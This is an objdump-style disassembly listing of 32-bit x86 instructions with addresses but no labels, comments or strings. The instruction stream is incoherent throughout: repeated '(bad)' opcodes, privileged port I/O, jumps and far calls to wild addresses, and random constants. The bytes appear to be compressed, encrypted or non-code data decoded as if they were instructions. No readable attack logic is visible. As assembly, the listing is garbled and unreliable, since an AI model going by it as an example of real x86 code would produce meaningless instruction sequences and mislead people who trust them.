  40fe74:	adc    BYTE PTR [edx-0x80],0x18
  40fe78:	push   es
  40fe79:	fisubr WORD PTR [eax+ebx*1-0x6e589111]
  40fe80:	aaa    
  40fe81:	pop    esi
  40fe82:	scas   eax,DWORD PTR es:[edi]
  40fe83:	pop    esp
  40fe84:	dec    ebx
  40fe85:	pminsw mm3,mm5
  40fe88:	jmp    0x40fe38
  40fe8a:	or     dl,BYTE PTR [ebp+0x67ba6e1c]
  40fe90:	icebp  
  40fe91:	push   eax
  40fe92:	lods   al,BYTE PTR ds:[esi]
  40fe93:	inc    ecx
  40fe94:	mov    edx,gs
  40fe96:	(bad)  
  40fe97:	cmp    eax,0x9b4d56f5
  40fe9c:	ins    DWORD PTR es:[edi],dx
  40fe9d:	add    DWORD PTR [eax],ebx
  40fe9f:	mov    bl,0x4c
  40fea1:	loopne 0x40fe4f
  40fea3:	aas    
  40fea4:	inc    esi
  40fea6:	int    0x2f
  40fea8:	add    BYTE PTR [ecx+0x4c],0x4c
  40feac:	xchg   edx,eax
  40fead:	daa    
  40feae:	rcr    BYTE PTR [edi+eax*4],cl
  40feb1:	ins    DWORD PTR es:[edi],dx
  40feb2:	xchg   edi,eax
  40feb3:	add    BYTE PTR [eax],0xea
  40feb6:	adc    eax,0x9124b646
  40febb:	loopne 0x40fee3
  40febd:	das    
  40febe:	inc    edi
  40febf:	or     eax,0x34658182
  40fec4:	pop    es
  40fec5:	rcl    BYTE PTR [esi-0x38],cl
  40fec8:	xor    bh,BYTE PTR [esi]
  40feca:	sbb    al,0xbf
  40fecc:	jp     0x40fe6f
  40fece:	add    DWORD PTR ds:0x96147354,ebx
  40fed4:	ds jmp 0x40febb
  40fed7:	sbb    BYTE PTR [ecx+eiz*1],ch
  40feda:	push   esi
  40fedb:	lahf   
  40fedc:	rcr    DWORD PTR [ecx-0x32],cl
  40fedf:	mov    BYTE PTR [eax+ebp*2],ch
  40fee2:	sub    al,0x82
  40fee4:	xlat   BYTE PTR ds:[ebx]
  40fee5:	mov    WORD PTR [edx+0x68d688cf],ds
  40feeb:	push   0x73718b59
  40fef0:	jg     0x40ff14
  40fef2:	daa    
  40fef3:	fwait
  40fef4:	stos   DWORD PTR es:[edi],eax
  40fef5:	sti    
  40fef6:	pop    edx
  40fef7:	mov    ch,BYTE PTR [ebx+ecx*4+0x6929fea8]
  40fefe:	adc    BYTE PTR [eax],bl
  40ff00:	adc    al,0x1b
  40ff02:	jae    0x40ff01
  40ff04:	stos   DWORD PTR es:[edi],eax
  40ff05:	sbb    ch,BYTE PTR [edx+0x6208332e]
  40ff0b:	pop    edx
  40ff0c:	jmp    0x40ff5b
  40ff0e:	scas   al,BYTE PTR es:[edi]
  40ff0f:	sbb    dl,BYTE PTR [ebp+0x1a4754e3]
  40ff15:	aam    0xbf
  40ff17:	sbb    BYTE PTR [eax+0xf],0x4e
  40ff1b:	imul   ecx,eax,0x51
  40ff1e:	push   es
  40ff1f:	jb     0x40fecf
  40ff21:	outs   dx,BYTE PTR ds:[esi]
  40ff22:	enter  0x48a6,0xc4
  40ff26:	add    eax,0xce351ee6
  40ff2b:	loop   0x40ff7e
  40ff2d:	arpl   sp,bx
  40ff2f:	push   ss
  40ff30:	fs xchg edx,eax
  40ff32:	aad    0xea
  40ff34:	fiadd  DWORD PTR [edx-0x628c484b]
  40ff3a:	pop    ds
  40ff3b:	(bad)  
  40ff3c:	push   ss
  40ff3d:	and    edi,DWORD PTR [ebx+0x5e]
  40ff40:	repnz loope 0x40ff6c
  40ff43:	popf   
  40ff44:	cmp    esi,DWORD PTR [ebp+ebx*8+0x4c14d192]
  40ff4b:	inc    esi
  40ff4c:	(bad)  
  40ff4d:	cmp    edx,edx
  40ff4f:	mov    eax,ds:0x29ae2abf
  40ff54:	fsub   st(0),st
  40ff56:	add    al,0x7f
  40ff58:	stos   BYTE PTR es:[edi],al
  40ff59:	mov    edi,0xaf35a11b
  40ff5e:	push   edx
  40ff5f:	out    0xa6,eax
  40ff61:	mov    al,0xbb
  40ff63:	loop   0x40ffb2
  40ff65:	dec    ebp
  40ff66:	fldenv [ecx-0xb]
  40ff69:	xchg   ecx,eax
  40ff6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff6b:	sub    eax,0xcff5ccc7
  40ff70:	cmc    
  40ff71:	sahf   
  40ff72:	cmp    BYTE PTR [edx+0x12d73b3a],0xe7
  40ff79:	inc    edx
  40ff7a:	outs   dx,DWORD PTR ds:[esi]
  40ff7b:	mov    edx,DWORD PTR [edx-0xafeb835]
  40ff81:	push   ebp
  40ff82:	pop    edi
  40ff83:	sbb    esi,DWORD PTR [edi+0x21f363c4]
  40ff89:	aad    0xd0
  40ff8b:	push   ebx
  40ff8c:	ror    DWORD PTR [ebx],cl
  40ff8e:	sbb    ebx,DWORD PTR [esi]
  40ff90:	icebp  
  40ff91:	pop    ebx
  40ff92:	jg     0x40ff65
  40ff94:	push   edi
  40ff95:	jb     0x40ff25
  40ff97:	bound  esp,QWORD PTR [ebp+0x2ce0425d]
  40ff9d:	xor    al,0xd6
  40ff9f:	dec    DWORD PTR [ebx]
  40ffa1:	sbb    DWORD PTR [ecx+0x71],ecx
  40ffa4:	out    0x5,eax
  40ffa6:	in     al,dx
  40ffa7:	or     DWORD PTR [ebx],0x590b3e8
  40ffad:	bnd jns 0x40ffc3
  40ffb0:	mov    dl,0x6d
  40ffb2:	pop    esi
  40ffb3:	enter  0x2db,0xe9
  40ffb7:	aas    
  40ffb8:	xchg   cl,cl
  40ffba:	cdq    
  40ffbb:	xchg   cl,bh
  40ffbd:	loop   0x40ffa7
  40ffbf:	cld    
  40ffc0:	(bad)  [ecx]
  40ffc2:	(bad)  
  40ffc3:	(bad)  
  40ffc4:	push   esi
  40ffc5:	sub    DWORD PTR [eax+eiz*4],ebp
  40ffc8:	jmp    0x4c757cd1
  40ffcd:	pop    edi
  40ffce:	fist   WORD PTR [edi+0x25]
  40ffd1:	or     dh,BYTE PTR [edx]
  40ffd3:	inc    eax
  40ffd4:	xor    al,BYTE PTR [eax+0x149042ed]
  40ffda:	adc    al,0xe
  40ffdc:	jg     0x40ff87
  40ffde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffdf:	xor    eax,DWORD PTR [edi+eiz*2+0x31]
  40ffe3:	xor    DWORD PTR gs:[edi+0x40],0xfffffff6
  40ffe8:	scas   eax,DWORD PTR es:[edi]
  40ffe9:	push   esp
  40ffea:	adc    BYTE PTR ds:0xabe22bbf,ch
  40fff0:	ja     0x40ffed
  40fff2:	jmp    0xb4b27765
  40fff7:	adc    DWORD PTR [ebx],0x79
  40fffa:	push   eax
  40fffb:	xchg   edx,eax
  40fffc:	xor    eax,0xc9e2854c
  410001:	sub    edx,DWORD PTR [eax+0x46cc8c6d]
  410007:	std    
  410008:	mov    cl,0x41
  41000a:	or     BYTE PTR [ecx],bl
  41000c:	popf   
  41000d:	and    DWORD PTR [edx-0x2d5cfb38],esi
  410013:	aaa    
  410014:	iret   
  410015:	mov    ebx,0xa657883
  41001a:	(bad)  
  41001b:	fiadd  WORD PTR [ebx-0x1e]
  41001e:	loopne 0x40fff0
  410020:	cmp    al,0x72
  410022:	jmp    0x48d70bd
  410027:	sub    al,0x84
  410029:	adc    BYTE PTR [edx],ch
  41002b:	jecxz  0x40ffc6
  41002d:	sbb    eax,0x7561962f
  410032:	data16 ss jae 0x40ffb9
  410036:	jb     0x41003d
  410038:	imul   edi,eax,0xf604b0f7
  41003e:	mov    esi,ebp
  410040:	ret    0x7a6e
  410043:	arpl   ax,sp
  410045:	cdq    
  410046:	stos   DWORD PTR es:[edi],eax
  410047:	dec    esi
  410048:	adc    bl,BYTE PTR [edi]
  41004a:	add    esp,esi
  41004c:	fstp   QWORD PTR [ebp-0x27]
  41004f:	push   ebp
  410050:	fstp   TBYTE PTR [ecx+0x33450f8]
  410056:	lahf   
  410057:	mov    edx,0x500bcf83
  41005c:	sub    DWORD PTR [edx+0x47],esp
  41005f:	and    eax,0x7e75eac
  410064:	mov    edx,0x729e9616
  410069:	push   es
  41006a:	in     al,0xb7
  41006c:	loop   0x41004d
  41006e:	pop    esi
  41006f:	xchg   DWORD PTR [esi-0x4d89afb8],edx
  410075:	ins    DWORD PTR es:[edi],dx
  410076:	sub    eax,eax
  410078:	add    DWORD PTR [edi+0x5b87bbc3],ebx
  41007e:	fmul   DWORD PTR [edi-0x386ddec0]
  410084:	and    al,0x24
  410086:	ins    DWORD PTR es:[edi],dx
  410087:	pop    ss
  410088:	cvtdq2ps xmm6,xmm7
  41008b:	cmp    DWORD PTR [esi],eax
  41008d:	mov    edx,0x78a03e9b
  410092:	mov    al,BYTE PTR [edx+eiz*1-0x72f1e2d8]
  410099:	push   0xffffffdd
  41009b:	dec    ebx
  41009c:	dec    esi
  41009d:	fwait
  41009e:	adc    dl,BYTE PTR [edi+0x5c]
  4100a1:	out    dx,eax
  4100a2:	pop    es
  4100a3:	xchg   esp,ebp
  4100a5:	mov    ds:0xd18f49cc,eax
  4100aa:	rcl    BYTE PTR [eax],cl
  4100ac:	jae    0x41009c
  4100ae:	inc    ecx
  4100af:	shr    BYTE PTR [esi],1
  4100b1:	ds cmp cl,dl
  4100b4:	js     0x41012b
  4100b6:	call   0x54333939
  4100bb:	lods   al,BYTE PTR ds:[esi]
  4100bc:	jbe    0x410046
  4100be:	fwait
  4100bf:	sbb    dh,cl
  4100c1:	xor    BYTE PTR [edi+0x18],bl
  4100c4:	sub    eax,0x58376db3
  4100c9:	bound  ebp,QWORD PTR [edi]
  4100cb:	mov    edx,0x64bb53ad
  4100d0:	(bad)  
  4100d1:	aam    0xa8
  4100d3:	hlt    
  4100d4:	xchg   esp,eax
  4100d5:	xor    al,0xdb
  4100d7:	sub    esp,DWORD PTR cs:[ecx-0x59]
  4100db:	jmp    0x9cc269db
  4100e0:	cmp    eax,0x9a36e627
  4100e5:	mov    WORD PTR [eax+0x7c07b99],fs
  4100eb:	cmc    
  4100ec:	jg     0x410119
  4100ee:	int    0x9a
  4100f0:	push   ds
  4100f1:	div    BYTE PTR [ebp-0x54d4cd62]
  4100f7:	pop    ds
  4100f8:	add    DWORD PTR [esi-0x25],0xb3ac284f
  4100ff:	ss pusha 
  410101:	int    0xc8
  410103:	fcom   QWORD PTR [eax]
  410105:	push   esi
  410106:	xchg   ebx,eax
  410107:	cmp    ch,0x79
  41010a:	and    DWORD PTR [edx],esp
  41010c:	mov    ds:0x6285f5ea,eax
  410111:	cmc    
  410112:	mov    edi,0x3725bbf8
  410117:	mov    dl,0x9
  410119:	loope  0x4100bf
  41011b:	jmp    0x41010b
  41011d:	xchg   esp,eax
  41011e:	sbb    ch,BYTE PTR [eax]
  410120:	mov    dh,dh
  410122:	sub    bh,dh
  410124:	xchg   edi,eax
  410125:	mov    ecx,0x8a24243f
  41012a:	xor    eax,0x85714dec
  41012f:	(bad)  
  410130:	shr    bl,cl
  410132:	push   esi
  410133:	ds lock push 0xfffffff9
  410137:	aad    0x7d
  410139:	pop    ss
  41013a:	sub    cl,BYTE PTR [ecx-0x69bb4de0]
  410140:	or     BYTE PTR [ebx],bh
  410142:	arpl   WORD PTR [ebp+0x55],cx
  410145:	pop    edx
  410146:	test   BYTE PTR [ecx-0x35],al
  410149:	arpl   WORD PTR [ecx-0x1bd8f773],dx
  41014f:	xchg   edx,eax
  410150:	mov    ah,0x77
  410152:	cld    
  410153:	push   ds
  410154:	pop    ebp
  410155:	mov    DWORD PTR [edx-0x7c],ecx
  410158:	and    al,0x9d
  41015a:	mov    ch,0x36
  41015c:	jbe    0x410125
  41015e:	xchg   edx,eax
  41015f:	jns    0x4100e3
  410161:	mov    ecx,0x5b051c1c
  410166:	bound  edx,QWORD PTR [esi]
  410168:	jge    0x410171
  41016a:	into   
  41016b:	ds add esp,0x6cfbabd7
  410172:	fiadd  WORD PTR [esp+ebx*1]
  410175:	xor    bh,BYTE PTR [ebx]
  410177:	mov    ecx,esi
  410179:	pop    esp
  41017a:	sub    eax,0x89e19798
  41017f:	mov    eax,0xf400ad02
  410184:	retf   0xc9c9
  410187:	fwait
  410188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018a:	and    dl,ch
  41018c:	pushf  
  41018d:	sti    
  41018e:	ds (bad) 
  410191:	pop    ebx
  410192:	sbb    eax,DWORD PTR [ecx-0x27]
  410195:	add    DWORD PTR [ecx+0x34],ecx
  410198:	mov    ecx,0x7882ce06
  41019d:	jae    0x41018c
  41019f:	or     al,0x11
  4101a1:	mov    WORD PTR [esi+0x4c],?
  4101a4:	stc    
  4101a5:	retf   0xe5e2
  4101a8:	sbb    DWORD PTR [ebx+0x16],esp
  4101ab:	mov    bl,0xab
  4101ad:	in     al,0x39
  4101af:	mov    edx,0xe24d4497
  4101b4:	push   esp
  4101b5:	mov    BYTE PTR [ebp+0x33aaf1b8],bh
  4101bb:	dec    ebx
  4101bc:	xor    BYTE PTR [ecx],bl
  4101be:	mov    ds:0x55131b59,eax
  4101c3:	jecxz  0x41019b
  4101c5:	push   ebx
  4101c6:	fwait
  4101c7:	not    BYTE PTR [ebp+0x6e]
  4101ca:	outs   dx,DWORD PTR ds:[esi]
  4101cb:	aas    
  4101cc:	dec    ebx
  4101cd:	push   ss
  4101ce:	mov    ecx,0x9424c75
  4101d3:	iret   
  4101d4:	out    0x11,eax
  4101d6:	dec    eax
  4101d7:	sub    bl,ch
  4101d9:	mov    esp,0xf2769620
  4101de:	mov    eax,0xb554fdc2
  4101e3:	addr16 fs ret 0x75ec
  4101e8:	sbb    al,bh
  4101ea:	push   esi
  4101eb:	xchg   esp,eax
  4101ec:	sub    al,0x6
  4101ee:	fwait
  4101ef:	ja     0x410264
  4101f1:	(bad)  
  4101f2:	arpl   WORD PTR [edi-0x526c486],sp
  4101f8:	pop    ss
  4101f9:	mov    DWORD PTR [edx-0x536dfe92],edi
  4101ff:	adc    al,0x22
  410201:	lock iret 
  410203:	sar    BYTE PTR [edx-0x24],cl
  410206:	arpl   WORD PTR [edi-0x42],ax
  410209:	pop    eax
  41020a:	repnz scas eax,DWORD PTR es:[edi]
  41020c:	jne    0x410221
  41020e:	out    dx,al
  41020f:	sbb    esp,DWORD PTR [edx-0x3]
  410212:	(bad)  
  410213:	jmp    0x8f2fe5af
  410218:	clc    
  410219:	mov    ah,BYTE PTR [edi-0x4b]
  41021c:	pop    eax
  41021d:	mov    bl,0xfd
  41021f:	iret   
  410220:	and    BYTE PTR [ecx+0x66],0x22
  410224:	inc    eax
  410225:	ins    DWORD PTR es:[edi],dx
  410226:	xchg   esp,eax
  410227:	std    
  410228:	fsub   st(6),st
  41022a:	jae    0x4101ec
  41022c:	dec    ecx
  41022d:	push   ss
  41022e:	icebp  
  41022f:	or     edi,DWORD PTR [eax]
  410231:	popa   
  410232:	sbb    eax,0x27470655
  410237:	fstp   DWORD PTR [esi]
  410239:	addr16 mov edi,0x99d0a92d
  41023f:	xchg   ecx,eax
  410240:	into   
  410241:	(bad)  [ebp-0x20]
  410244:	inc    ebp
  410245:	dec    edx
  410246:	call   0x7da2e02b
  41024b:	shr    BYTE PTR [esi+0x7f],1
  41024e:	popf   
  41024f:	pop    ecx
  410250:	inc    esp
  410251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410252:	add    ebp,esp
  410254:	jge    0x410219
  410256:	push   eax
  410257:	(bad)  
  410258:	jbe    0x41028a
  41025a:	mov    al,ds:0x5b57c714
  41025f:	pop    ss
  410260:	pop    es
  410261:	aam    0xb8
  410263:	pop    edi
  410264:	dec    edi
  410265:	dec    edi
  410266:	sub    ah,BYTE PTR [eax]
  410268:	in     eax,0x36
  41026a:	mov    eax,0xefe19265
  41026f:	test   eax,0x65bb953d
  410274:	lods   al,BYTE PTR es:[esi]
  410276:	mov    ah,BYTE PTR [ebx-0x218cedff]
  41027c:	jns    0x410215
  41027e:	enter  0x88f3,0xee
  410282:	mov    esi,DWORD PTR [edi+ecx*8]
  410285:	fisttp WORD PTR [edx+edi*8]
  410288:	stos   BYTE PTR es:[edi],al
  410289:	loopne 0x4102ac
  41028b:	mov    ds:0xad5db8aa,al
  410290:	xor    eax,0xe34d6d14
  410295:	add    DWORD PTR [esi+0x6d3a04b4],0x3b
  41029c:	gs in  al,dx
  41029e:	adc    al,0xd3
  4102a0:	cli    
  4102a1:	sub    eax,0xa54dfe1f
  4102a6:	pop    es
  4102a7:	add    DWORD PTR [ebx-0x61],0x7b
  4102ab:	push   eax
  4102ac:	sqrtps xmm5,XMMWORD PTR [eax-0x11]
  4102b0:	in     al,0xc5
  4102b2:	add    al,0x3b
  4102b4:	sbb    eax,0x9f8d3ed0
  4102b9:	add    eax,0x1e68e70e
  4102be:	inc    eax
  4102bf:	mul    DWORD PTR [edx-0x4171e325]
  4102c5:	or     DWORD PTR [ebx],ebp
  4102c7:	in     al,0x2e
  4102c9:	push   edi
  4102ca:	or     eax,0xdeb5d0b3
  4102cf:	adc    al,0xe2
  4102d1:	jnp    0x4102a9
  4102d3:	or     BYTE PTR [ecx+0xd836e0d],0x72
  4102da:	mov    eax,0x1b6f4526
  4102df:	arpl   WORD PTR [edx],di
  4102e1:	test   eax,0xfcaa5d25
  4102e6:	daa    
  4102e7:	mov    esp,DWORD PTR [ebx+0x7d]
  4102ea:	aaa    
  4102eb:	mov    cl,0x9d
  4102ed:	in     al,dx
  4102ee:	outs   dx,BYTE PTR ds:[esi]
  4102ef:	lods   eax,DWORD PTR ds:[esi]
  4102f0:	pop    esp
  4102f1:	outs   dx,BYTE PTR ds:[esi]
  4102f2:	dec    edx
  4102f3:	jmp    0xb9f4b512
  4102f8:	or     dh,bh
  4102fa:	xor    ecx,DWORD PTR [edx]
  4102fc:	mov    ecx,0x22fef070
  410301:	mov    ebx,0x344e7bd1
  410306:	int    0x59
  410308:	dec    esp
  410309:	scas   eax,DWORD PTR es:[edi]
  41030a:	xor    al,0xa9
  41030c:	or     al,0xdd
  41030e:	in     al,dx
  41030f:	dec    ecx
  410310:	push   esi
  410311:	pop    ecx
  410312:	in     al,dx
  410313:	and    al,0x7e
  410315:	dec    edx
  410316:	xchg   DWORD PTR [ebx-0xfb8d3b2],esi
  41031c:	out    dx,eax
  41031d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41031e:	into   
  41031f:	data16 mov es,WORD PTR fs:[ebx-0x30d2bab1]
  410327:	fwait
  410328:	sbb    al,0xb7
  41032a:	sti    
  41032b:	sub    edx,0x6f57a3e7
  410331:	es aad 0x6d
  410334:	dec    ebp
  410335:	in     al,dx
  410336:	and    bl,ch
  410338:	inc    edx
  410339:	push   0x4bf82378
  41033e:	repz popa 
  410340:	pop    ds
  410341:	dec    ebx
  410342:	ret    
  410343:	jl     0x410381
  410345:	pop    ebp
  410346:	pushf  
  410347:	sbb    edi,0x14
  41034a:	add    al,0xb2
  41034c:	fadd   QWORD PTR ds:0x67f6c451
  410352:	jmp    0x6809:0xc312e486
  410359:	adc    al,0xe8
  41035b:	scas   eax,DWORD PTR es:[edi]
  41035c:	mov    al,ds:0xf0908de0
  410361:	adc    edi,0xd5891634
  410367:	jl     0x410398
  410369:	push   esi
  41036a:	cmp    DWORD PTR ds:[ecx],edx
  41036d:	jbe    0x4103db
  41036f:	xabort 0x97
  410372:	jmp    DWORD PTR [esi-0x73]
  410375:	and    al,0x44
  410377:	test   al,0x55
  410379:	cmp    DWORD PTR [edx],eax
  41037b:	mov    ds,WORD PTR [ebx+edx*1-0x61]
  41037f:	or     eax,ebx
  410381:	popf   
  410382:	and    ebp,DWORD PTR [edi-0x49782491]
  410388:	sbb    eax,esp
  41038a:	in     eax,dx
  41038b:	test   eax,0x81c05b39
  410390:	hlt    
  410391:	iret   
  410392:	add    BYTE PTR [edx+0x4b],cl
  410395:	add    al,BYTE PTR [esp+ebp*2]
  410398:	pushf  
  410399:	xchg   edx,eax
  41039a:	push   ss
  41039b:	aad    0xab
  41039d:	cdq    
  41039e:	jle    0x410408
  4103a0:	xchg   ebx,eax
  4103a1:	pop    ds
  4103a2:	dec    esi
  4103a3:	ret    0xb796
  4103a6:	dec    eax
  4103a7:	arpl   WORD PTR [ebp-0x55],bp
  4103aa:	sub    DWORD PTR [edx],esi
  4103ac:	sbb    al,bl
  4103ae:	sub    dl,BYTE PTR [ebp-0x2a16ab29]
  4103b4:	pop    ds
  4103b5:	push   cs
  4103b6:	shr    DWORD PTR [eax+0x61133a51],cl
  4103bc:	imul   ah
  4103be:	sbb    BYTE PTR [edi-0x5a4df87],0xe
  4103c5:	std    
  4103c6:	popa   
  4103c7:	inc    esp
  4103c8:	gs push edx
  4103ca:	mov    BYTE PTR [ebp+0x5c],bl
  4103cd:	xor    al,0xc1
  4103cf:	leave  
  4103d0:	push   eax
  4103d1:	and    al,0x20
  4103d3:	leave  
  4103d4:	dec    edi
  4103d5:	add    BYTE PTR [edx+0x76f46bad],ch
  4103db:	ret    0xbfe3
  4103de:	arpl   bx,bp
  4103e0:	jbe    0x410362
  4103e2:	pop    es
  4103e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103e4:	adc    eax,0x64453bd0
  4103e9:	inc    edi
  4103ea:	pop    edi
  4103eb:	aaa    
  4103ec:	dec    esp
  4103ed:	cmp    bh,BYTE PTR [ebx]
  4103ef:	ss popa 
  4103f1:	jl     0x4103c1
  4103f3:	push   0xffffff92
  4103f5:	jmp    0x1b78447a
  4103fa:	(bad)  
  4103fb:	sub    al,0x14
  4103fd:	daa    
  4103fe:	loop   0x410446
  410400:	in     eax,0x83
  410402:	or     ah,BYTE PTR [ecx]
  410404:	mov    WORD PTR [ecx-0x16070105],ss
  41040a:	mov    dh,0xb8
  41040c:	inc    ebp
  41040d:	mov    edi,DWORD PTR [ecx-0x2]
  410410:	jnp    0x4103fb
  410412:	xor    al,ah
  410414:	jl     0x410399
  410416:	ret    0x3a2a
  410419:	inc    esp
  41041a:	jnp    0x4103aa
  41041c:	cli    
  41041d:	or     cl,BYTE PTR [edx]
  41041f:	(bad)  
  410420:	out    dx,eax
  410421:	mov    esi,0x5edf0ef6
  410426:	shl    BYTE PTR [edi-0x2051d534],cl
  41042c:	(bad)  
  41042d:	adc    eax,0x39107ef2
  410432:	sbb    esi,DWORD PTR [edx]
  410434:	push   ebp
  410435:	mov    ds:0x5100484b,eax
  41043a:	sahf   
  41043b:	in     eax,dx
  41043c:	dec    ebx
  41043d:	push   esi
  41043e:	aas    
  41043f:	cli    
  410440:	das    
  410441:	mov    ds:0x1537752,eax
  410446:	(bad)  
  410447:	repnz aad 0x2b
  41044a:	pop    ebx
  41044b:	mov    edx,0xd4801ef0
  410450:	pop    ecx
  410451:	dec    ebp
  410452:	adc    eax,0x2b4bde20
  410457:	jmp    0x410423
  410459:	repz jae 0x410491
  41045c:	adc    dl,BYTE PTR [esp+eiz*2+0x55626e95]
  410463:	ret    
  410464:	sub    DWORD PTR [ecx-0x21b7a7a7],0x84c2190a
  41046e:	xor    eax,0x4ac74f2f
  410473:	mov    dh,BYTE PTR [ebp-0x4211bf7]
  410479:	cmp    ebx,DWORD PTR [ebp-0x5896dfa1]
  41047f:	cli    
  410480:	jbe    0x410428
  410482:	xchg   edi,eax
  410483:	or     DWORD PTR [ebx+0x2a0863e8],0x66
  41048a:	push   ebx
  41048b:	iret   
  41048c:	cmp    edi,DWORD PTR [ebx]
  41048e:	pushf  
  41048f:	fdivr  QWORD PTR [edx-0x27]
  410492:	pop    ebx
  410493:	stc    
  410494:	mov    ds:0x2fff284b,al
  410499:	imul   ecx,DWORD PTR [ebx+0x33bf5539],0x2c1c12b9
  4104a3:	enter  0x3ad3,0xf9
  4104a7:	or     cl,BYTE PTR [edx-0x10]
  4104aa:	mov    bl,0xe8
  4104ac:	jmp    DWORD PTR [ecx+0x406f0323]
  4104b2:	xchg   esi,eax
  4104b3:	retf   0x5398
  4104b6:	shl    BYTE PTR [ecx-0x5b8ef0c7],0xda
  4104bd:	inc    edx
  4104be:	or     dl,0xd8
  4104c1:	jmp    DWORD PTR [ebx+0x6e60e853]
  4104c7:	inc    ebp
  4104c8:	inc    edx
  4104c9:	rol    DWORD PTR [ebp-0x7129a287],1
  4104cf:	xor    ch,dl
  4104d1:	sub    DWORD PTR ds:0xf5555eb0,0x3bf94918
  4104db:	jmp    0x41f4181f
  4104e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104e1:	adc    dl,BYTE PTR ds:0x18023ed0
  4104e7:	sbb    BYTE PTR [edx],ch
  4104e9:	and    DWORD PTR [edi-0x3ae13c52],ebx
  4104ef:	sbb    al,0x85
  4104f1:	retf   0xa329
  4104f4:	jecxz  0x410481
  4104f6:	cmp    BYTE PTR [ecx-0xd],bl
  4104f9:	dec    esp
  4104fa:	push   ebx
  4104fb:	mov    al,BYTE PTR [edx-0x49]
  4104fe:	xchg   ecx,eax
  4104ff:	mov    ds:0xed0cdf99,al
  410504:	or     BYTE PTR [edx+0x5],cl
  410507:	or     DWORD PTR [ebx],eax
  410509:	call   0x67ea52e8
  41050e:	cmp    bh,BYTE PTR [eax-0x44]
  410511:	and    al,0xf1
  410513:	sbb    eax,0x9215e831
  410518:	xchg   ecx,eax
  410519:	lods   al,BYTE PTR ds:[esi]
  41051a:	lods   eax,DWORD PTR ds:[esi]
  41051b:	fcomp  st(4)
  41051d:	int    0xac
  41051f:	mov    ch,0x25
  410521:	jecxz  0x410520
  410523:	dec    ecx
  410524:	xor    al,0xb5
  410526:	pop    ecx
  410527:	leave  
  410528:	test   eax,0x96ec6af3
  41052d:	mov    bh,dh
  41052f:	ret    0x1a83
  410532:	jge    0x410564
  410534:	inc    esp
  410535:	call   0xfec8:0x51c0094b
  41053c:	int3   
  41053d:	in     al,dx
  41053e:	push   es
  41053f:	test   eax,0xaa90c5f
  410544:	push   cs
  410545:	sbb    DWORD PTR [esi+edx*4-0x43],0x1fb8a126
  41054d:	pusha  
  41054e:	inc    eax
  41054f:	call   0x586f:0x11ef1fc6
  410556:	aam    0xe6
  410558:	sti    
  410559:	push   cs
  41055a:	(bad)
  41055d:	push   edi
  41055e:	adc    BYTE PTR [eax+0x5d],cl
  410561:	xor    al,0x86
  410563:	push   ebp
  410564:	sub    ebp,DWORD PTR gs:[esi+0x6a9d12f7]
  41056b:	and    al,0xc4
  41056d:	(bad)  
  41056e:	stc    
  41056f:	and    al,0xea
  410571:	mov    ds:0x47af904e,al
  410576:	add    al,0x36
  410578:	mov    edx,0x71638a2f
  41057d:	mov    dl,0xe0
  41057f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410581:	jecxz  0x4105f3
  410583:	sub    DWORD PTR cs:[ecx+ebx*8],edx
  410587:	data16 add al,dl
  41058a:	shr    DWORD PTR [ecx],1
  41058c:	jp     0x4105f4
  41058e:	mov    edx,0xd1f4b2a4
  410593:	cmp    DWORD PTR [edx-0x32c59696],ebx
  410599:	enter  0x92ac,0x5c
  41059d:	push   cs
  41059e:	mov    al,ds:0xd8dec337
  4105a3:	mov    ch,0x3f
  4105a5:	push   ss
  4105a6:	mov    gs,WORD PTR [ebx-0xc8c2567]
  4105ac:	jmp    0x4105c1
  4105ae:	ds dec edx
  4105b0:	pop    edx
  4105b1:	adc    bl,BYTE PTR ds:0x812c14f1
  4105b7:	in     eax,dx
  4105b8:	push   edi
  4105b9:	inc    edi
  4105ba:	lods   eax,DWORD PTR ds:[esi]
  4105bb:	jg     0x4105de
  4105bd:	or     al,0x3e
  4105bf:	ja     0x41055e
  4105c1:	inc    eax
  4105c2:	xchg   BYTE PTR [ecx-0x3c53ed77],al
  4105c8:	pop    edx
  4105c9:	sub    BYTE PTR [eax-0x43],ah
  4105cc:	push   ss
  4105cd:	pop    ds
  4105ce:	mov    edi,DWORD PTR [ebx]
  4105d0:	and    dh,BYTE PTR [eax+0x71]
  4105d3:	(bad)  
  4105d4:	bound  ebx,QWORD PTR [edi+edx*8+0x19d0cd57]
  4105db:	push   ds
  4105dc:	leave  
  4105dd:	push   ds
  4105de:	jno    0x410627
  4105e0:	adc    eax,ecx
  4105e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105e3:	loop   0x410636
  4105e5:	mov    dl,0x73
  4105e7:	push   ds
  4105e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105e9:	adc    al,0xfb
  4105eb:	jp     0x410667
  4105ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ee:	loope  0x4105a4
  4105f0:	cld    
  4105f1:	aaa    
  4105f2:	sti    
  4105f3:	mov    al,0x68
  4105f5:	leave  
  4105f6:	fwait
  4105f7:	cli    
  4105f8:	nop
  4105f9:	push   eax
  4105fa:	sub    BYTE PTR [edx],dl
  4105fc:	test   al,0x35
  4105fe:	inc    eax
  4105ff:	xor    ax,0xdf25
  410603:	or     eax,0xc02a5ce6
  410608:	xor    al,0x8a
  41060a:	stos   DWORD PTR es:[edi],eax
  41060b:	aam    0xa9
  41060d:	divps  xmm2,XMMWORD PTR [edx]
  410610:	cmc    
  410611:	(bad)  
  410612:	xchg   esi,eax
  410613:	push   cs
  410614:	dec    esi
  410615:	shl    BYTE PTR [edx+0x48e4e307],cl
  41061b:	enter  0x4e9,0x3d
  41061f:	in     eax,dx
  410620:	inc    ebx
  410621:	call   0xc8244c14
  410626:	jmp    0xc2c3771f
  41062b:	into   
  41062c:	inc    esp
  41062d:	sub    eax,0x92108c4c
  410632:	bnd jg 0x4105f6
  410635:	jbe    0x4105f3
  410637:	out    0x28,al
  410639:	test   al,0xdb
  41063b:	add    ebp,0x1e
